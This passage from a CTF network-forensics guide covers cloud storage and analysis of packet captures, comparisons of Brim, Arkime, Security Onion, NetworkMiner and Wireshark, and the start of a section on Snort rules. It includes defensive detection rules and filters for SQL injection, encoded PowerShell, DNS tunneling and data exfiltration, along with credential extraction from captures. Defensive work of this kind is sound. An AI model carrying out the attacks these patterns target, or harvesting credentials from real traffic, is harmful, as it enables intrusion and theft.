- **Hot tier (frequent access)**: Recent captures for active investigations
- **Cool/Infrequent tier**: Week-old captures for reference
- **Archive tier**: Long-term retention for compliance

```bash
# AWS S3 Intelligent-Tiering
aws s3api put-bucket-intelligent-tiering-configuration \
  --bucket ctf-captures \
  --id AutoArchive \
  --intelligent-tiering-configuration file://tiering-config.json

# Example tiering-config.json
{
  "Id": "AutoArchive",
  "Status": "Enabled",
  "Tierings": [
    {"Days": 90, "AccessTier": "ARCHIVE_ACCESS"},
    {"Days": 180, "AccessTier": "DEEP_ARCHIVE_ACCESS"}
  ]
}
```

**Compute cost reduction:**

- Use spot/preemptible instances for non-time-critical analysis (60-90% cost savings)
- Implement auto-scaling for variable workloads
- Utilize reserved instances/committed use discounts for baseline capacity
- Leverage serverless for sporadic, event-driven analysis

**Data transfer optimization:**

- Process data in same region as storage to avoid egress charges
- Use content delivery networks (CloudFront, Cloud CDN) for frequently accessed captures
- Compress before transfer when bandwidth-limited

```bash
# Regional processing to avoid transfer costs
aws lambda create-function \
  --function-name pcap-analyzer \
  --runtime python3.11 \
  --region us-east-1 \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip \
  --role arn:aws:iam::account:role/lambda-execution

# Environment variable specifies regional S3 bucket
aws lambda update-function-configuration \
  --function-name pcap-analyzer \
  --environment Variables={BUCKET_REGION=us-east-1}
```

### Hybrid Cloud Architectures

**On-premises capture with cloud analysis:**

```bash
# Local capture with cloud upload
tcpdump -i eth0 -C 100 -W 5 -z "aws s3 cp %s s3://ctf-captures/" -w /tmp/capture.pcap

# Alternative: streaming to cloud with fifo
mkfifo /tmp/capture_pipe
tcpdump -i eth0 -w /tmp/capture_pipe &
aws s3 cp /tmp/capture_pipe s3://ctf-captures/stream.pcap

# Periodic sync with compression
find /local/captures -name "*.pcap" -mmin +60 | \
  xargs -I {} sh -c 'gzip {} && aws s3 mv {}.gz s3://ctf-captures/archived/'
```

**Multi-cloud analysis federation:**

[Inference] Federating analysis across multiple cloud providers may improve resilience and leverage provider-specific capabilities, though cross-cloud data transfer costs and authentication complexity require careful consideration.

```bash
# Sync captures across clouds
# AWS -> GCP
aws s3 sync s3://ctf-captures/ /tmp/sync/
gsutil -m rsync -r /tmp/sync/ gs://ctf-captures-mirror/

# GCP -> Azure
gsutil -m cp -r gs://ctf-captures/* /tmp/sync/
azcopy copy '/tmp/sync/*' 'https://ctfanalysis.blob.core.windows.net/captures/'

# Distributed analysis coordination
# Worker 1 (AWS): Analyze protocol distribution
# Worker 2 (GCP): Extract IOCs
# Worker 3 (Azure): Perform threat correlation
# Results aggregated in central database (e.g., managed PostgreSQL)
```

### Security and Compliance Considerations

**Encryption:**

- Encrypt captures at rest using provider-managed or customer-managed keys
- Use SSL/TLS for data in transit
- Implement client-side encryption for highly sensitive captures

```bash
# AWS KMS encryption
aws s3 cp capture.pcap s3://ctf-captures/ \
  --sse aws:kms \
  --sse-kms-key-id arn:aws:kms:region:account:key/key-id

# Client-side encryption before upload
openssl enc -aes-256-cbc -salt -in capture.pcap -out capture.pcap.enc -k $PASSWORD
aws s3 cp capture.pcap.enc s3://ctf-captures/
```

**Access control:**

- Implement least-privilege IAM policies
- Use separate buckets/containers for different sensitivity levels
- Enable audit logging for access tracking

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::ctf-captures/*",
        "arn:aws:s3:::ctf-captures"
      ],
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "203.0.113.0/24"
        }
      }
    }
  ]
}
```

**Compliance:**

- Implement retention policies matching regulatory requirements
- Enable versioning for audit trail preservation
- Use compliance-certified regions and services

```bash
# Enable S3 versioning for audit trail
aws s3api put-bucket-versioning \
  --bucket ctf-captures \
  --versioning-configuration Status=Enabled

# Object lock for regulatory compliance
aws s3api put-object-lock-configuration \
  --bucket ctf-captures \
  --object-lock-configuration '{"ObjectLockEnabled":"Enabled","Rule":{"DefaultRetention":{"Mode":"COMPLIANCE","Years":7}}}'
```

### Real-Time Cloud Streaming Analysis

**AWS Kinesis for packet streaming:**

```python
# Producer: stream packet metadata to Kinesis
import boto3
import json
from scapy.all import sniff

kinesis = boto3.client('kinesis', region_name='us-east-1')

def packet_callback(packet):
    if packet.haslayer('IP'):
        record = {
            'timestamp': packet.time,
            'src': packet['IP'].src,
            'dst': packet['IP'].dst,
            'proto': packet['IP'].proto,
            'len': len(packet)
        }
        kinesis.put_record(
            StreamName='packet-stream',
            Data=json.dumps(record),
            PartitionKey=packet['IP'].src
        )

sniff(prn=packet_callback, store=0)
```

```python
# Consumer: analyze stream with Kinesis Analytics
# SQL query in Kinesis Data Analytics application:
"""
CREATE OR REPLACE STREAM "ANOMALY_STREAM" (
    src_ip VARCHAR(16),
    connection_count INTEGER,
    unique_destinations INTEGER
);

CREATE OR REPLACE PUMP "ANOMALY_PUMP" AS
INSERT INTO "ANOMALY_STREAM"
SELECT STREAM src, COUNT(*) as connection_count, COUNT(DISTINCT dst) as unique_destinations
FROM "SOURCE_SQL_STREAM_001"
GROUP BY src, STEP("SOURCE_SQL_STREAM_001".ROWTIME BY INTERVAL '1' MINUTE);
"""
```

**Google Cloud Pub/Sub and Dataflow:**

```python
# Publisher: send packet metadata to Pub/Sub
from google.cloud import pubsub_v1
import json

publisher = pubsub_v1.PublisherClient()
topic_path = publisher.topic_path('project-id', 'packet-topic')

def publish_packet(packet):
    data = json.dumps({
        'timestamp': packet.time,
        'src_ip': packet['IP'].src,
        'dst_ip': packet['IP'].dst,
        'protocol': packet['IP'].proto
    }).encode('utf-8')
    
    publisher.publish(topic_path, data)

# Dataflow pipeline for stream processing (Apache Beam)
import apache_beam as beam

def analyze_traffic(element):
    # Aggregation and anomaly detection logic
    return element

with beam.Pipeline() as pipeline:
    (pipeline
     | 'Read from Pub/Sub' >> beam.io.ReadFromPubSub(topic='packet-topic')
     | 'Parse JSON' >> beam.Map(json.loads)
     | 'Analyze' >> beam.Map(analyze_traffic)
     | 'Write to BigQuery' >> beam.io.WriteToBigQuery('project:dataset.analysis_results'))
```

### Performance Benchmarking

**Cloud instance selection for PCAP analysis:**

[Inference] Compute-optimized instances generally provide best price-performance for CPU-intensive packet analysis, while memory-optimized instances suit large in-memory datasets (e.g., connection tracking, statistical modeling).

```bash
# Benchmark analysis on different instance types
# AWS c5.2xlarge vs c5.4xlarge vs c5.9xlarge
for instance_type in c5.2xlarge c5.4xlarge c5.9xlarge; do
    echo "Testing $instance_type"
    aws ec2 run-instances --instance-type $instance_type ... --user-data '#!/bin/bash
        time tshark -r /tmp/1GB_capture.pcap -q -z io,phs
        time tshark -r /tmp/1GB_capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" -w /dev/null
    ' | grep real
done

# Storage performance impact
# EBS gp3 vs io2 vs instance store
fio --name=sequential_write --rw=write --bs=1M --size=10G --numjobs=1 --directory=/mnt/capture
```

### Monitoring and Alerting

**CloudWatch metrics for analysis workloads:**

```bash
# Custom metric: analysis processing rate
aws cloudwatch put-metric-data \
  --namespace CTFAnalysis \
  --metric-name PacketsProcessed \
  --value 1000000 \
  --unit Count \
  --timestamp $(date -u +"%Y-%m-%dT%H:%M:%S")

# Create alarm for processing failures
aws cloudwatch put-metric-alarm \
  --alarm-name analysis-failures \
  --alarm-description "Alert on analysis failures" \
  --metric-name Errors \
  --namespace AWS/Lambda \
  --statistic Sum \
  --period 300 \
  --threshold 5 \
  --comparison-operator GreaterThanThreshold \
  --evaluation-periods 1
```

**Stackdriver/Cloud Monitoring for GCP:**

```bash
# Log-based metric for packet processing
gcloud logging metrics create packets_processed \
  --description="Packets analyzed" \
  --log-filter='resource.type="cloud_function" AND textPayload:"Processed packets"'

# Alert policy
gcloud alpha monitoring policies create \
  --notification-channels=CHANNEL_ID \
  --display-name="High error rate" \
  --condition-threshold-value=10 \
  --condition-threshold-duration=300s
```

### Recommended Cloud Architectures for CTF Scenarios

**Scenario 1: Rapid burst analysis (competition CTF)**

- Spot/preemptible instances for cost-effective scaling
- Object storage for capture ingestion
- Parallel processing with container jobs
- Estimated setup time: 30-60 minutes
- Cost: $1-5 per hour for moderate workloads

**Scenario 2: Continuous monitoring (defensive CTF)**

- Managed Kubernetes for persistent analysis workers
- Streaming ingestion (Kinesis/Pub/Sub/Event Hubs)
- Time-series database for metrics (InfluxDB, TimescaleDB)
- Real-time alerting integration
- Estimated setup time: 4-8 hours
- Cost: $50-200 per day depending on traffic volume

**Scenario 3: Forensic investigation (post-event analysis)**

- Archive storage for capture retention
- On-demand compute for deep analysis
- SQL analytics engines (Athena/BigQuery) for pattern discovery
- Estimated setup time: 2-4 hours
- Cost: $10-50 per investigation

**Scenario 4: Distributed multi-site monitoring**

- Regional capture points with edge processing
- Central data lake for aggregation
- Federated query capabilities
- Global load balancing for management interface
- Estimated setup time: 1-2 days
- Cost: $200-1000 per month

### Important Considerations

**Bandwidth limitations:** Cloud provider network limits may constrain high-throughput packet capture. Verify instance network performance specifications before deployment.

**Regional data residency:** Ensure capture storage and processing comply with data sovereignty requirements, particularly for CTFs involving sensitive or regulated environments.

**Ephemeral nature:** Cloud resources can be terminated accidentally or automatically. Implement proper state management, backup strategies, and infrastructure-as-code for reproducibility.

**Cost monitoring:** Establish billing alerts and budget limits to prevent unexpected charges during extended analysis operations.

```bash
# AWS budget alert
aws budgets create-budget \
  --account-id 123456789012 \
  --budget file://budget.json \
  --notifications-with-subscribers file://notifications.json
```

---

## Related Subtopics

For comprehensive CTF network traffic analysis mastery, consider exploring these related areas:

- **Packet Capture at Scale**: Advanced techniques for capturing multi-gigabit traffic without loss
- **Network Traffic Baseline Development**: Statistical modeling and anomaly detection methodologies
- **Malware Traffic Analysis**: Identifying command-and-control channels, exfiltration patterns, and infection vectors
- **Encrypted Traffic Analysis**: Techniques for analyzing TLS/SSL traffic through metadata and side-channel analysis
- **Industrial Control System (ICS) Protocol Analysis**: Specialized approaches for SCADA, Modbus, and other ICS protocols commonly appearing in infrastructure CTFs

---

# Alternative Tools & Frameworks

## Brim Security Platform

### Overview

Brim is an open-source desktop application for security and network traffic analysis that provides a modernized interface for processing pcap files and Zeek logs. It combines packet capture analysis with structured log analysis through an integrated workflow.

### Core Architecture

- **Data Lake Approach**: Converts pcap files into Zed data format (columnar storage optimized for search)
- **Zeek Integration**: Automatically processes captures through Zeek to generate protocol logs
- **Query Language**: Uses Zed language (formerly Zql) for data queries, more intuitive than BPF for complex searches
- **Parallel Processing**: Handles large pcap files through chunked processing and indexing

### Installation & Setup

```bash
# Download from GitHub releases
wget https://github.com/brimdata/brim/releases/download/v1.x.x/brim_1.x.x_amd64.deb
sudo dpkg -i brim_1.x.x_amd64.deb

# Alternative: AppImage for portable use
wget https://github.com/brimdata/brim/releases/download/v1.x.x/Brim-1.x.x.AppImage
chmod +x Brim-1.x.x.AppImage
./Brim-1.x.x.AppImage
```

### Workflow in CTF Scenarios

**Initial Analysis**:

1. Import pcap file (automatically processes through Zeek)
2. Review auto-generated protocol breakdown
3. Examine connection summaries in conn.log view

**Query Examples**:

```zed
# Find all HTTP requests with specific user agent
_path=="http" user_agent=="suspicious-agent"

# Detect DNS tunneling (long queries)
_path=="dns" len(query) > 50

# Extract all files transferred
_path=="files" | cut _path, tx_hosts, rx_hosts, mime_type, filename

# Find connections with unusual byte ratios
_path=="conn" orig_bytes > 1000000 resp_bytes < 1000

# Search for specific IP across all log types
10.0.0.5
```

**Data Export**:

```bash
# Export query results as JSON
# Use Export button in UI or zq CLI tool
zq -f json 'your_query' input.zng > output.json

# Export specific fields as CSV
zq -f csv 'cut id.orig_h, id.resp_h, id.resp_p' conn.zng > connections.csv
```

### CTF Advantages

- **Rapid Protocol Analysis**: Instant Zeek log generation without manual processing
- **Pivoting**: Click any field to create new queries (faster than Wireshark filters)
- **File Extraction**: Built-in file carving from protocol logs
- **Timeline Visualization**: Histogram view for temporal attack analysis

### Limitations

- **No Packet Inspection**: Cannot examine individual packet bytes (use Wireshark export for this)
- **Resource Intensive**: Large files require significant memory for indexing
- **Learning Curve**: Zed query language differs from standard BPF/display filters

## Moloch/Arkime

### Overview

Arkime (formerly Moloch) is a large-scale network traffic indexing and search system designed for enterprise packet capture analysis. It consists of capture probes, Elasticsearch storage, and a web interface.

### Architecture Components

- **Capture**: Multi-threaded packet capture daemon with protocol parsing
- **Elasticsearch**: Stores parsed metadata and PCAP pointers
- **Viewer**: Web UI for searching and session reconstruction
- **WISE**: Plugin system for threat intelligence integration

### Installation (Single-Host CTF Setup)

```bash
# Install dependencies
sudo apt update
sudo apt install -y wget curl python3 python3-pip openjdk-11-jdk

# Install Elasticsearch
wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.17.x-amd64.deb
sudo dpkg -i elasticsearch-7.17.x-amd64.deb
sudo systemctl start elasticsearch

# Download and install Arkime
wget https://github.com/arkime/arkime/releases/download/v4.x.x/arkime_4.x.x-1_amd64.deb
sudo dpkg -i arkime_4.x.x-1_amd64.deb

# Configure Arkime
cd /opt/arkime/bin
sudo ./Configure

# Initialize database
sudo /opt/arkime/db/db.pl http://localhost:9200 init

# Add admin user
sudo /opt/arkime/bin/arkime_add_user.sh admin "Admin User" password --admin

# Start services
sudo systemctl start arkimecapture
sudo systemctl start arkimeviewer
```

### Configuration for CTF (Offline Analysis)

Edit `/opt/arkime/etc/config.ini`:

```ini
[default]
elasticsearch=http://localhost:9200
rotateIndex=daily
pcapDir=/path/to/pcap/storage
maxFileSizeG=4
interface=none
pcapReadMethod=offline
```

### Importing Pcap Files

```bash
# Import single file
/opt/arkime/bin/capture -r capture.pcap

# Import directory of files
for f in /path/to/pcaps/*.pcap; do
    /opt/arkime/bin/capture -r "$f"
done

# Import with tagging
/opt/arkime/bin/capture -r evidence.pcap --tag ctf-challenge-01
```

### Search Queries (Web Interface)

**Basic Searches**:

```
# IP-based searches
ip.src == 192.168.1.100
ip.dst == 10.0.0.5
ip == 172.16.0.0/16

# Protocol filters
protocols == tls && tls.version == "TLSv1.2"
protocols == ssh
http.method == POST

# Content searches
http.uri == */admin*
dns.host == *evil.com
http.user-agent == *python*

# File analysis
file.category == executable
file.name == *.exe

# Boolean combinations
(ip.src == 10.0.0.5 || ip.dst == 10.0.0.5) && protocols == http
```

**Advanced Hunt Queries**:

```
# Data exfiltration detection
bytes > 10000000 && packets < 100

# Beaconing detection
(ip.dst == external_ip) && starttime >= "2024-01-01" 
&& groupby:[ip.dst] > 10

# Certificate analysis
cert.alt == *phishing-domain*
cert.issuer.cn != "Legitimate CA"
```

### Session Reconstruction

1. Navigate to Sessions view
2. Apply filters to isolate target traffic
3. Right-click session → "Session Detail"
4. Export options:
    - PCAP download
    - ASCII/Hex view
    - Natural/Image view for HTTP

### CTF-Specific Features

- **PCAP Export**: Download filtered sessions as new pcap files
- **SPI View**: Statistics on protocols, countries, ASNs
- **Connections Graph**: Visualize communication patterns
- **Hunt Mode**: Create persistent queries for monitoring

### API Usage (Automation)

```bash
# Authentication
TOKEN="your_auth_token"
ARKIME="http://localhost:8005"

# Search via API
curl -u admin:password "$ARKIME/api/sessions?expression=ip.src==10.0.0.5"

# Export PCAP programmatically
curl -u admin:password "$ARKIME/api/sessions.pcap?expression=http.host==evil.com" \
    -o filtered_traffic.pcap

# Get statistics
curl -u admin:password "$ARKIME/api/spiview?spi=ip.dst"
```

## Security Onion

### Overview

Security Onion is a Linux distribution for network security monitoring that integrates multiple tools into a unified platform. It combines full packet capture, IDS, and log analysis.

### Integrated Tool Stack

- **Capture**: Stenographer (full packet capture), Suricata/Snort (IDS)
- **Analysis**: Zeek, Arkime, NetworkMiner
- **SIEM**: Elasticsearch, Logstash, Kibana (ELK Stack)
- **Case Management**: TheHive, Cortex
- **Detection**: Sigma rules, YARA

### Installation Types

**Standalone (CTF Lab)**:

```bash
# Download ISO from securityonionsolutions.com
# Boot from ISO, select "Install Security Onion"
# During setup, choose:
# - Standalone deployment
# - Evaluation mode (for testing)
# - Import mode (for pcap analysis)
```

**Import Mode Configuration**:

```bash
# After installation, enable import mode
sudo so-import-pcap /path/to/capture.pcap

# Monitor import progress
sudo so-import-pcap-status

# Access web interface
# https://[security-onion-ip]
```

### Workflow for CTF Pcap Analysis

**Initial Import**:

```bash
# Import with custom job name
sudo so-import-pcap -i import1 /evidence/challenge.pcap

# Import multiple files
for pcap in /evidence/*.pcap; do
    sudo so-import-pcap -i "$(basename $pcap)" "$pcap"
done
```

**Analysis Through Kibana Dashboards**:

1. Navigate to Kibana interface
2. Use pre-built dashboards:
    - **Suricata Alerts**: IDS signature hits
    - **Zeek Connections**: Protocol breakdowns
    - **HTTP**: Web traffic analysis
    - **DNS**: Query patterns
    - **File Transfers**: Extracted files

**Suricata Rule Management**:

```bash
# Add custom rules for CTF
sudo nano /etc/suricata/rules/local.rules

# Example CTF detection rule
alert http any any -> any any (msg:"CTF Flag Pattern"; \
    content:"flag{"; http_uri; sid:1000001; rev:1;)

# Update and restart
sudo rule-update
sudo so-suricata-restart
```

**Zeek Script Customization**:

```bash
# Add custom Zeek scripts
sudo nano /opt/zeek/share/zeek/site/local.zeek

# Example: Extract all Base64 from HTTP
@load policy/protocols/http/detect-webapps

event http_message_done(c: connection, is_orig: bool, stat: http_message_stat)
{
    if (is_orig && /[A-Za-z0-9+\/=]{20,}/ in c$http$uri)
        print fmt("Possible Base64 in URI: %s", c$http$uri);
}

# Deploy changes
sudo so-zeek-restart
```

### Querying Through Kibana

**KQL (Kibana Query Language) Examples**:

```
# Alert searches
event_type:alert AND alert.signature:*SQL*

# Protocol-specific
event_type:http AND http.hostname:*evil.com*
event_type:dns AND dns.query:*suspicious*

# Connection analysis
event_type:conn AND dest_ip:192.168.1.100 AND dest_port:443

# File extraction
event_type:files AND mime_type:*pdf*

# Temporal queries
event_type:alert AND @timestamp >= "2024-01-01T00:00:00"
```

**Aggregations for Pattern Detection**:

```
# Top talkers
dest_ip AND event_type:conn | stats count() by dest_ip

# Beacon detection
src_ip:10.0.0.5 AND dest_port:443 | stats count() by dest_ip
```

### Stenographer (Full Packet Capture)

**Query Syntax**:

```bash
# Extract packets by IP
sudo stenoread 'host 192.168.1.100' -w output.pcap

# Extract by time range
sudo stenoread 'before 2024-01-01T12:00:00 and after 2024-01-01T10:00:00' -w timerange.pcap

# Complex queries
sudo stenoread 'host 10.0.0.5 and tcp and port 80' -w filtered.pcap
```

### CTF Advantages

- **Integrated Workflow**: Single platform for multiple analysis types
- **Automated Analysis**: IDS/Zeek processing without manual setup
- **Alert Triage**: Built-in case management for organizing findings
- **Hunt Capabilities**: Kibana queries enable hypothesis-driven investigation

### Limitations for CTF

- **Resource Heavy**: Requires significant RAM/CPU (minimum 12GB RAM recommended)
- **Complexity**: Many moving parts; troubleshooting can be time-consuming
- **Startup Time**: Initial import and indexing takes longer than lightweight tools

## NetworkMiner vs Wireshark

### Comparison Matrix

|Aspect|NetworkMiner|Wireshark|
|---|---|---|
|**Primary Focus**|Host-centric analysis, artifact extraction|Packet-level protocol analysis|
|**Interface Type**|GUI with automated categorization|GUI with manual filtering|
|**File Extraction**|Automatic with preview|Manual (Export Objects)|
|**OS Fingerprinting**|Built-in passive detection|Requires manual analysis or p0f integration|
|**Credential Extraction**|Automated for common protocols|Manual (requires knowing protocol structure)|
|**Session Reconstruction**|Automatic by host|Manual (Follow Stream)|
|**Anomaly Detection**|Parameter-based anomaly view|Requires Expert Info or manual inspection|
|**Scripting/Automation**|Limited (CLI in Pro version)|Extensive (tshark, Lua)|
|**Performance on Large Files**|Better (indexed approach)|Slower (full packet parsing)|

### NetworkMiner Detailed Workflow

**Installation**:

```bash
# Kali Linux installation
sudo apt update
sudo apt install networkminer

# Launch
sudo networkminer
```

**Analysis Approach**:

1. **File → Open** → Select pcap
2. Navigate tabs in order:
    - **Hosts**: Identify all systems in capture
    - **Files**: Review extracted artifacts
    - **Images**: Quick triage of transferred images
    - **Messages**: Email/chat content
    - **Credentials**: Captured authentication
    - **Sessions**: TCP/UDP flows
    - **DNS**: Query log
    - **Parameters**: HTTP parameters, cookies

**Targeted CTF Techniques**:

_Host Profiling_:

- Right-click host → "Expand All" to see full details
- Check "Operating System" for fingerprint data
- Review "Sent/Received Files" per host

_File Carving_:

- Files tab automatically extracts HTTP, FTP, SMB transfers
- Filter by extension (e.g., .zip, .exe, .pdf)
- Right-click → "Open Folder" to access extracted files

_Credential Harvesting_:

```
Credentials tab shows:
- FTP: USER/PASS commands
- HTTP Basic Auth: Base64 decoded automatically
- NTLM: Challenge/response (shows username/domain)
- Kerberos: Principal names
```

_Anomaly Detection_:

- Parameters tab → Sort by "Parameter Name"
- Look for unusual encoding (Base64, hex)
- Check for SQL injection patterns in HTTP parameters

**CLI Usage (Professional Version Feature)**:

```bash
# [Unverified] Professional version syntax (consult official documentation)
networkminer-cli -r capture.pcap -o output_directory
```

### Wireshark Detailed Workflow

**Installation & Configuration**:

```bash
# Already included in Kali
wireshark

# Run as root (not recommended for security)
sudo wireshark

# Better: Add user to wireshark group
sudo usermod -a -G wireshark $USER
# Log out and back in
```

**Optimized Display Filters for CTF**:

_Protocol Isolation_:

```
http.request or http.response
ftp.request.command or ftp.response.code
smtp.command or smtp.response
dns.qry.name contains "suspicious"
```

_Data Exfiltration Detection_:

```
# Large uploads
http.request.method == "POST" and http.content_length > 1000000

# Outbound transfers
ftp.request.command == "STOR"

# DNS tunneling
dns.qry.name matches "^[a-f0-9]{20,}\."
```

_Credential Exposure_:

```
# HTTP Basic Auth
http.authbasic

# FTP credentials
ftp.request.command == "USER" or ftp.request.command == "PASS"

# SMTP AUTH
smtp.req.command == "AUTH"
```

_Traffic Anomalies_:

```
# Non-standard ports
tcp.port == 80 and not http
tcp.port == 443 and not tls

# Fragmented packets
ip.flags.mf == 1

# Invalid checksums (may indicate manipulation)
ip.checksum_bad or tcp.checksum_bad
```

**Advanced Filtering Techniques**:

_Frame-Level Analysis_:

```
# Packets with specific TTL (routing detection)
ip.ttl == 64

# DSCP markings (QoS/priority abuse)
ip.dsfield.dscp != 0

# Fragmentation offset patterns
ip.frag_offset > 0
```

_Statistical Operators_:

```
# Conversations above threshold
tcp.stream eq 5 and frame.time_relative < 10

# Packet burst detection
frame.time_delta_displayed > 0.1
```

**Scripting with tshark**:

_Extract Specific Fields_:

```bash
# Extract all HTTP hosts
tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort -u

# Dump all DNS queries
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name

# Extract User-Agents
tshark -r capture.pcap -Y "http.user_agent" -T fields \
    -e ip.src -e http.user_agent

# Export HTTP objects programmatically
tshark -r capture.pcap --export-objects http,./extracted_http/
```

_Protocol Hierarchy Statistics_:

```bash
# Generate protocol distribution
tshark -r capture.pcap -q -z io,phs

# Conversation statistics
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z conv,udp
```

_Custom Output Formats_:

```bash
# JSON export for further processing
tshark -r capture.pcap -Y "http.request" -T json > http_requests.json

# CSV for spreadsheet analysis
tshark -r capture.pcap -T fields -E header=y -E separator=, \
    -e frame.time -e ip.src -e ip.dst -e tcp.dstport > connections.csv
```

**Lua Scripting for Automation**:

```lua
-- Save as custom_extractor.lua
local function extract_data()
    local tap = Listener.new("http")
    
    function tap.packet(pinfo,tvb,ip)
        local host = tostring(f_http_host())
        if host and host:find("evil") then
            print(string.format("%s: Suspicious host %s", 
                tostring(pinfo.abs_ts), host))
        end
    end
end

extract_data()

-- Run with:
-- tshark -r capture.pcap -X lua_script:custom_extractor.lua
```

### When to Use Each Tool

**Use NetworkMiner When**:

- Need rapid host inventory
- Extracting files is primary goal
- Analyzing multi-host environments
- Time-constrained CTF challenges
- Credential harvesting from mixed protocols

**Use Wireshark When**:

- Investigating protocol-level anomalies
- Analyzing encrypted traffic metadata (TLS handshakes)
- Tracking specific TCP streams
- Examining packet timing/sequencing
- Custom protocol analysis
- Need automation via tshark/scripts

**Use Both Together**:

1. Start with NetworkMiner for initial triage (5 minutes)
2. Identify suspicious hosts/sessions
3. Switch to Wireshark for deep-dive on specific streams
4. Export targeted pcaps for focused analysis

### Integration Workflow Example

**Scenario**: Analyze pcap for data exfiltration

```bash
# Step 1: NetworkMiner quick scan
sudo networkminer
# Review Hosts tab for outliers, Files tab for suspicious transfers

# Step 2: Export suspicious host conversations
# In Wireshark:
ip.addr == 10.0.0.5 and ip.addr == 192.168.1.100
# File → Export Specified Packets → Save as suspect.pcap

# Step 3: Deep protocol analysis
tshark -r suspect.pcap -q -z io,phs
tshark -r suspect.pcap -Y "http.request.method == POST" -T fields \
    -e frame.time -e http.request.uri -e http.file_data

# Step 4: Extract payload for forensics
tshark -r suspect.pcap -Y "http.request.method == POST" \
    -T fields -e http.file_data | xxd -r -p > exfiltrated.bin
```

## Tool Selection Strategy for CTF

**Time-Sensitive Challenges** (< 30 minutes):

1. Brim → Fast protocol breakdown
2. NetworkMiner → Automated artifact extraction
3. Wireshark → Only if above tools insufficient

**Complex Multi-Stage Attacks**:

1. Security Onion (if available) → Comprehensive automated analysis
2. Arkime → Session correlation across large datasets
3. Wireshark → Protocol-specific deep dives

**Steganography/Data Hiding**:

1. Wireshark → Packet-level inspection
2. tshark scripting → Extract specific byte patterns
3. NetworkMiner → Confirm no obvious artifacts missed

**Large Capture Files** (> 1GB):

1. Arkime → Indexed search capabilities
2. tshark filtering → Extract smaller subsets
3. Avoid loading full file in Wireshark GUI

**Important Subtopics for Further Study**

- **Zeek Scripting**: Custom protocol detection and artifact extraction
- **Elasticsearch Query DSL**: Advanced hunting in Arkime/Security Onion
- **tshark Automation**: Batch processing and pipeline integration
- **Stenographer**: Full packet capture architecture for large-scale retention
- **PCAP-NG Format**: Extended capture format with richer metadata

---

## Snort Rule Creation

### Snort Architecture and Rule Engine

**Core Components**

- Packet Decoder: Processes raw packets from network interfaces
- Preprocessors: Normalize and reconstruct traffic (TCP reassembly, HTTP normalization)
- Detection Engine: Matches packets against rule signatures
- Logging/Alerting: Outputs to unified2, syslog, or database formats
- Output Modules: Integration with SIEM and analysis platforms

**Rule Syntax Structure**

```
[action] [protocol] [src_ip] [src_port] -> [dst_ip] [dst_port] (rule options)
```

### Basic Rule Construction

**Alert on Suspicious Traffic**

```bash
# Simple HTTP GET request detection
alert tcp any any -> any 80 (msg:"HTTP GET Request Detected"; \
    content:"GET"; http_method; \
    sid:1000001; rev:1; \
    classtype:attempted-recon;)

# Detect SQL injection attempts in URI
alert tcp any any -> any 80 (msg:"Possible SQL Injection in URI"; \
    content:"GET"; http_method; \
    content:"union"; http_uri; nocase; \
    content:"select"; http_uri; nocase; distance:0; \
    pcre:"/union.+select/i"; \
    sid:1000002; rev:1; \
    classtype:web-application-attack; \
    reference:url,owasp.org/www-community/attacks/SQL_Injection;)

# Detect base64-encoded PowerShell in HTTP
alert tcp any any -> any 80 (msg:"Base64 Encoded PowerShell Command"; \
    content:"powershell"; http_uri; nocase; \
    content:"encodedcommand"; http_uri; nocase; distance:0; \
    pcre:"/[A-Za-z0-9+\/]{50,}={0,2}/"; \
    sid:1000003; rev:1; \
    classtype:trojan-activity; \
    metadata:impact_flag red;)
```

**Protocol-Specific Detection**

DNS Tunneling Detection:

```bash
# Detect excessive DNS query length (potential tunneling)
alert udp any any -> any 53 (msg:"Possible DNS Tunneling - Excessive Query Length"; \
    content:"|01 00 00 01|"; offset:2; depth:4; \
    dsize:>100; \
    byte_test:2,>,50,12,relative; \
    sid:1000010; rev:1; \
    classtype:policy-violation;)

# Detect suspicious TXT record queries
alert udp any any -> any 53 (msg:"DNS TXT Record Query - Possible Data Exfiltration"; \
    content:"|00 10|"; offset:4; depth:2; \
    byte_test:2,>,200,0,relative; \
    threshold:type threshold, track by_src, count 10, seconds 60; \
    sid:1000011; rev:1; \
    classtype:policy-violation;)
```

FTP Command Injection:

```bash
# Detect FTP command overflow attempts
alert tcp any any -> any 21 (msg:"FTP Command Buffer Overflow Attempt"; \
    flow:to_server,established; \
    content:"USER "; depth:5; \
    content:!"|0a|"; within:300; \
    pcre:"/USER\s+[^\r\n]{200,}/"; \
    sid:1000020; rev:1; \
    classtype:attempted-admin;)

# Detect FTP bounce attack
alert tcp any any -> any 21 (msg:"FTP Bounce Attack Detected"; \
    flow:to_server,established; \
    content:"PORT "; depth:5; \
    pcre:"/PORT\s+\d+,\d+,\d+,\d+,/"; \
    sid:1000021; rev:1; \
    reference:cve,1999-0017; \
    classtype:attempted-admin;)
```

### Advanced Rule Options

**Content Matching with Modifiers**

```bash
# HTTP header analysis with multiple content matches
alert tcp any any -> any 80 (msg:"Suspicious User-Agent and POST Combination"; \
    flow:to_server,established; \
    content:"POST"; http_method; \
    content:"python-requests"; http_user_agent; nocase; \
    content:!"boundary="; http_header; \
    content:"application/x-www-form-urlencoded"; http_header; \
    sid:1000030; rev:1; \
    classtype:web-application-attack;)

# Binary protocol detection with byte_test
alert tcp any any -> any any (msg:"PE Executable Transfer Detected"; \
    flow:established,to_client; \
    content:"|4d 5a|"; offset:0; depth:2; \
    byte_test:4,>,0x3000,60,relative,little; \
    byte_test:2,=,0x014c,0,relative; \
    content:"This program"; distance:0; within:100; \
    sid:1000040; rev:1; \
    classtype:policy-violation;)
```

**PCRE (Perl Compatible Regular Expressions)**

```bash
# Detect credit card numbers in cleartext
alert tcp any any -> any any (msg:"Credit Card Number in Cleartext"; \
    flow:established; \
    pcre:"/\b(?:4\d{3}|5[1-5]\d{2}|6011|3[47]\d{2})\s?\d{4}\s?\d{4}\s?\d{4}\b/"; \
    sid:1000050; rev:1; \
    classtype:policy-violation; \
    reference:url,pci-dss-compliance;)

